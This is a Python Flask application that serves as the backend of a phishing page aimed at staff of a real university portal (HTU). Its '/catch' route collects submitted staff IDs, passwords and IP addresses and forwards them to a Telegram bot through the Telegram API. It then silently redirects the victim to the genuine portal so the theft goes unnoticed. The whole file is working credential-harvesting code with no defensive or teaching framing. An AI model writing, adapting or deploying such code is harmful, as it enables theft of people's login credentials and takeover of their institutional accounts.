from flask import Flask, request
import requests
import os

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

# Read your HTML file
with open('index.html', 'r', encoding='utf-8') as f:
    HTML_PAGE = f.read()

@app.route('/', methods=['GET'])
def home():
    return HTML_PAGE

@app.route('/catch', methods=['POST'])
def catch():
    staff_id = request.form.get('staff_id')
    password = request.form.get('password')
    ip = request.remote_addr
    
    message = f"HTU Login\nStaff ID: {staff_id}\nPassword: {password}\nIP: {ip}"
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={'chat_id': CHAT_ID, 'text': message})
    
    return '''
    <html>
        <head>
            <meta http-equiv="refresh" content="0; url=https://htu.edu.gh">
        </head>
        <body>
            <p>Redirecting to portal...</p>
        </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
